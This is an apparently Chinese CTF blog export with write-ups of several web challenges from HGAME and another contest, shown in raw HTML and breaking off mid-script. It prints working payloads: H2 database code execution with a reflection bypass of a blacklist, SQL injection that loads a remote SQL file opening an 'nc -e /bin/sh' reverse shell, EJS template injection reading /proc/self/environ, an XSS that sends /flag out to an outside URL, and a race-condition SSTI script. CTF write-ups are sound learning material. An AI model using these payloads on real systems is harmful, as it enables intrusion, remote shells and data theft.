class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>发现他会一直执行，刚开始的思路是环境变量劫持sleep函数让他执行<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>再<code>export PATH=/tmp:$PATH</code>再创建一个<code>/tmp/sleep</code>为<code>cat /flag &gt; /var/www/html/backup/1</code>给权限</p><p>我自己尝试会执行<code>/tem/sleep</code>但由于没有权限就是空文件，但是backp.sh不会执行这个文件，不知道为什么</p><p>后来发现<code>backup.sh</code>使用了通配符<code>*</code>那我们是不是可以再文件名上下手</p><p>刚刚好cp有一个参数<code>-H</code>可以让软链接也被复制</p><p>那么就可以实现</p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  不是常规文件名不可以用<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>然后等一会发现<code>/backup</code>文件夹中有1</p><p>再读取1拿到flag</p><h2 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h2><p>真的easy吗，呜呜呜，源码分析得到数据库是<code>h2</code>数据库，有一个账号</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin<br><span class="hljs-symbol">passwd:</span>admin<br></code></pre></td></tr></table></figure><p>但是没什么用，而且flag要通过&#x2F;readflag读取，单纯sql是拿不到高shell的，所以我们要另寻他法</p><p>上网查到h2数据库可以执行java代码，那么是不是可以利用这一点来实现任意命令执行能</p><p>网上下载了h2数据库本地部署</p><p>写一个Java函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS exec_cmd; CREATE ALIAS exec_cmd AS <span class="hljs-string">&#x27;String rce() throws java.io.IOException &#123;</span><br><span class="hljs-string">    java.util.Scanner cmd_output = new java.util.Scanner(Runtime.getRuntime().exec(&quot;ls&quot;).getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span><br><span class="hljs-string">    return cmd_output.hasNext() ? cmd_output.next() : &quot;&quot;;</span><br><span class="hljs-string">&#125;&#x27;</span>; CALL <span class="hljs-title function_">exec_cmd</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>发现确实可以执行命令</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210224050126.png" alt="image-20250210224050126"></p><p>但是存在黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>  blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过Java的反射机制改写一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS RCE;<br>CREATE ALIAS RCE AS $$ <br>String <span class="hljs-title function_">rce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123; <br>  <span class="hljs-type">byte</span>[] classNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodName2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;; <br>  <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./readflag&quot;</span>; <br>  Class&lt;?&gt; clazz = java.lang.Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(classNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method1</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodName2), String.class); <br>  method2.invoke(method1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;payload&#125;); <br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Exploited&quot;</span>; <br>&#125; $$;CALL <span class="hljs-title function_">RCE</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p>本地测试可以执行命令，但是上传之后</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/c7896c977a222bee80520fb8f7e7cb58.png" alt="c7896c977a222bee80520fb8f7e7cb58"></p><p>只是这样没有回显，后面试了好久是，要不就是500</p><p>又去网上找了下找到<a href="https://www.cnblogs.com/F12-blog/p/18144377">这篇文章</a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210233304791.png" alt="image-20250210233304791"></p><p>上传恶意sql文件，再控制jdbc url指向他</p><p>那就不要过滤了，直接写java</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS RCE <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;String rce(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;1&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">CALL</span> RCE (<span class="hljs-string">&#x27;nc ip 32771 -e /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>使用<code>python3 -m http.server port</code>开启服务</p><p>sql什么也没过滤直接写</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; from link_schema(&#x27;</span>TEST2<span class="hljs-string">&#x27;, &#x27;&#x27;, concat(&#x27;</span>jdbc:h2:mem:testdb1;TRACE_LEVEL_SYSTEM_OUT<span class="hljs-operator">=</span><span class="hljs-number">3</span>;<span class="hljs-keyword">IN</span><span class="hljs-string">&#x27;,&#x27;</span>IT<span class="hljs-operator">=</span>RUNSC<span class="hljs-string">&#x27;,&#x27;</span>RIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">8.138</span><span class="hljs-number">.181</span><span class="hljs-number">.58</span>:<span class="hljs-number">32771</span><span class="hljs-operator">/</span><span class="hljs-number">1.</span><span class="hljs-keyword">sql</span><span class="hljs-string">&#x27;&#x27;&#x27;), &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>PUBLIC<span class="hljs-string">&#x27;);--</span><br></code></pre></td></tr></table></figure><p>登录拿到shell</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210234642888.png" alt="image-20250210234642888"></p><p><code>./readflag</code>拿到flag</p><h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1><p>一道xss但是CSP限制只能加载同源脚本，对于前端不是很了解，分析不是很透彻</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> csp = <span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>比赛</tag>
      
      <tag>zip上传</tag>
      
      <tag>linux越权</tag>
      
      <tag>CVE-2024-2961</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgameweek1</title>
    <link href="/2025/02/07/hgameweek1/"/>
    <url>/2025/02/07/hgameweek1/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a><strong>Pacman</strong></h2><p>一个是一道js逆向吧，没怎么写明白，控制调试后修改分数大于10000然后挂了就行，</p><p>但其实flag就在代码里面，虽然混淆的很厉害但是代码利用3个base4，一个个是就出来了</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a><strong>BandBomb</strong></h2><p>刚开始看到主界面的全回显以为有xss，测了很久发现没有</p><p>发现每次访问根路由都要加载模板文件，而且在rename路由又有任意文件覆盖那就考虑覆盖模板文件mortis.ejs</p><p>首先上传一个ejs文件，payload.ejs </p><p>文件内容：&lt;%&#x3D; (Function(‘return process.mainModule.require’)())(‘child_process’).execSync(‘cat &#x2F;proc&#x2F;self&#x2F;environ’).toString() %&gt;</p><p>然后访问rename路由发送</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;oldName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload.ejs&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;newName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;../views/mortis.ejs&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>访问主页就能拿到flag</p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a><strong>MysteryMessageBoard</strong></h2><p>首先进来弱口令爆破得到密码888888</p><p>给了源码</p><p>有个flag路由，但是需要admin访问才可以</p><p>访问admin路由会触发在后台触发一个无头浏览器，登录admin账号而且访问index界面</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock()<br><span class="hljs-keyword">defer</span> lock.Unlock()<br>ctx, cancel := chromedp.NewContext(context.Background())<br><span class="hljs-keyword">defer</span> cancel()<br>ctx, _ = context.WithTimeout(ctx, <span class="hljs-number">20</span>*time.Second)<br><span class="hljs-keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Chromedp error:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// 无头浏览器操作</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTasks</span><span class="hljs-params">()</span></span> chromedp.Tasks &#123;<br><span class="hljs-keyword">return</span> chromedp.Tasks&#123;<br>chromedp.Navigate(<span class="hljs-string">&quot;/login&quot;</span>),<br>chromedp.WaitVisible(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>, <span class="hljs-string">&quot;admin&quot;</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;password&quot;]`</span>, <span class="hljs-string">&quot;fake_password&quot;</span>),<br>chromedp.Click(<span class="hljs-string">`input[type=&quot;submit&quot;]`</span>),<br>chromedp.Navigate(<span class="hljs-string">&quot;/&quot;</span>),<br>chromedp.Sleep(<span class="hljs-number">5</span> * time.Second),<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时候他是admin权限的，那我们就可以xssfetch外带出来，搭建一个xss平台（这里我使用自己的）</p><p>在首页留言</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>()) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;你的网址?flag=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(flag)); &#125;); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250206155331709.png" alt="image-20250206155331709"></p><h2 id="双面人派对"><a href="#双面人派对" class="headerlink" title="双面人派对"></a><strong>双面人派对</strong></h2><p>看不懂。。。来个re大佬带带我</p><h2 id="角落"><a href="#角落" class="headerlink" title="角落"></a>角落</h2><p>首先访问robots.txt</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/app.conf</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>app<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>fuzz一下&#x2F;app&#x2F;发现两个</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/app/i</span>ndex<br><span class="hljs-regexp">/app/</span><span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>看看<code>/app.conf</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Include by httpd.conf</span><br><span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;</span><br><span class="hljs-attribute">Options</span> Indexes<br><span class="hljs-attribute">AllowOverride</span> None<br><span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<br><span class="hljs-section">&lt;/Directory&gt;</span><br><br><span class="hljs-section">&lt;Files <span class="hljs-string">&quot;/usr/local/apache2/app/app.py&quot;</span>&gt;</span><br>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span><br>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><br><span class="hljs-section">&lt;/Files&gt;</span><br><br><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><br><span class="hljs-attribute">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-attribute">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>大概意思就是以&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app为根路径，但是不让访问app.py</p><p>但是当**user-agent为L1nk&#x2F;**开头是会重写规则把url改变,带UA头可以进行任意文件读取 是<a href="https://www.aqtd.com/nd.jsp?id=6874">CVE-2024-38474</a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211111656036.png" alt="image-20250211111656036"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211112403913.png" alt="image-20250211112403913"></p><p>访问&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py%3f，user-agent为L1nk&#x2F;Chrome得到app.py</p><p>带个？让file块无法匹配（<code>?</code> 是一个特殊字符，用于分隔<strong>路径</strong>和<strong>查询参数</strong>）</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br><span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>status = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(message) <br>f.close()<br><br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>发现在首页写的都会存放在临时文件中，当我们访问read路由时都会读取最新一条还会检测存在<code>&#123;</code>吗 但是文件一直可以写入</p><p>那么我们大量的写入同时大量访问理论上可以在执行read_message（）的if判断时是正常的信息，而在渲染时是ssti代码就可以拿到shell</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>TARGET = <span class="hljs-string">&quot;http://node1.hgame.vidar.club:30288/app&quot;</span><br><br>MALICIOUS_PAYLOAD = <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_benign</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;benign&quot;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_benign error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_malicious</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: MALICIOUS_PAYLOAD&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_malicious error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_read</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/read&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        r = session.get(url, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trigger_read error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt</span>():<br>    set_benign()<br><br>    t = threading.Timer(<span class="hljs-number">0.01</span>, set_malicious)<br>    t.start()<br><br>    time.sleep(<span class="hljs-number">0.005</span>)<br><br>    result = trigger_read()<br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始尝试触发条件竞争漏洞以获得 flag ...&quot;</span>)<br>    attempt_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        attempt_count += <span class="hljs-number">1</span><br>        result = attempt()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;hgame&#123;&quot;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可能成功获得 flag：&quot;</span>)<br>            <span 